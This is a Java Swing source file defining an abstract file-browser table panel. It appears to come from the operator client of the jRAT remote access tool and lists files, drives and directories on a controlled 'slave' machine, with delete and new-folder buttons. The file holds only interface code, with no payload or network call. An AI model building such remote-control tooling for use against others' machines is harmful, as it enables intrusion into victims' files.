package se.jrat.client.ui.components;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.DefaultComboBoxModel;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.JToolBar;
import javax.swing.table.DefaultTableModel;

import se.jrat.client.AbstractSlave;
import se.jrat.client.io.FileObject;
import se.jrat.client.ui.renderers.JComboBoxIconRenderer;
import se.jrat.client.ui.renderers.table.FileViewTableRenderer;
import se.jrat.client.utils.IconUtils;
import se.jrat.client.utils.Utils;

@SuppressWarnings("serial")
public abstract class FileTable extends JPanel {

	protected JToolBar toolBar;
	protected JTable table;
	public FileViewTableRenderer tableRenderer;
	private DefaultTableModel tableModel;
	
	protected JComboBox<String> driveComboBox;
	protected DefaultComboBoxModel<String> driveComboModel;
	protected JComboBoxIconRenderer renderer;
	
	protected JTextField txtDir;
	
	public FileTable() {
		this(null);
	}
	
	public FileTable(AbstractSlave slave) {
		setLayout(new BorderLayout(0, 0));
		
		toolBar = new JToolBar();
		toolBar.setFloatable(false);
		add(toolBar, BorderLayout.NORTH);
		
		tableRenderer = new FileViewTableRenderer(slave);
		
		this.tableModel = new DefaultTableModel(null, new Object[] { "File name", "File size", "Last modified", "Hidden" }) {
			@Override
			public boolean isCellEditable(int row, int column) {
				return false;
			}
		};
		
		JScrollPane sp = new JScrollPane();
		table = new JTable(getTableModel());
		table.setDefaultRenderer(Object.class, tableRenderer);
		table.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (e.getClickCount() == 2 && table.getSelectedRow() != -1) {
					FileObject fo = getSelectedFileObject();
					if (fo.isDirectory()) {
						clear();
						onItemClick(fo.getPath());
					}
				}
			}
		});
		sp.setViewportView(table);
		add(sp, BorderLayout.CENTER);
		
		JButton btnBack = new JButton("");
		toolBar.add(btnBack);
		btnBack.setToolTipText("Back");
		btnBack.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				onBack();
			}
		});
		btnBack.setIcon(IconUtils.getIcon("arrow-left"));
		
		JButton btnRefresh = new JButton("");
		toolBar.add(btnRefresh);
		btnRefresh.setToolTipText("Reload");
		btnRefresh.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0) {
				onReload();
			}
		});
		btnRefresh.setIcon(IconUtils.getIcon("refresh"));
		
		JButton btnDelete = new JButton("");
		toolBar.add(btnDelete);
		btnDelete.setToolTipText("Delete");
		btnDelete.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				onDelete();
			}
		});
		btnDelete.setIcon(IconUtils.getIcon("delete"));
		
		JButton btnNewFolder = new JButton("");
		btnNewFolder.setToolTipText("New Folder");
		btnNewFolder.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				onCreateFolder();
			}
		});
		btnNewFolder.setIcon(IconUtils.getIcon("folder-add"));
		toolBar.add(btnNewFolder);
		
		driveComboBox = new JComboBox<String>();
		driveComboBox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
			}
		});
		driveComboModel = (DefaultComboBoxModel<String>) driveComboBox.getModel();
		renderer = new JComboBoxIconRenderer();
		
		toolBar.add(driveComboBox);
		
		txtDir = new JTextField();
		txtDir.setEditable(false);
		toolBar.add(txtDir);
	}
	
	public String getSelectedItem() {
		int i = table.getSelectedRow();
		
		return table.getValueAt(i, 0).toString();
	}
	
	public String[] getSelectedItems() {
		String[] rows = new String[table.getSelectedRowCount()];
		
		int pos = 0;
		for (int i : table.getSelectedRows()) {
			rows[pos++] = table.getValueAt(i, 0).toString();
		}

		return rows;
	}
	
	public abstract void onBack();
	
	public abstract void onReload();
	
	public abstract void onDelete();
	
	public abstract void onCreateFolder();
	
	public abstract void onItemClick(String item);
	
	public void setDirectory(String directory) {
		txtDir.setText(directory);
	}

	public String getCurrentDirectory() {
		return txtDir.getText();
	}
	
	public void clear() {
		while (getTableModel().getRowCount() > 0) {
			getTableModel().removeRow(0);
		}
	}
	
	public void addPopup(JPopupMenu menu) {
		Utils.addPopup(table, menu);
	}
	
	public void addFileObject(FileObject fo) {
		getTableModel().addRow(new Object[] { fo });
	}
	
	public FileObject getSelectedFileObject() {
		int i = table.getSelectedRow();
		
		return (FileObject) table.getValueAt(i, 0);
	}

	public DefaultTableModel getTableModel() {
		return tableModel;
	}
}
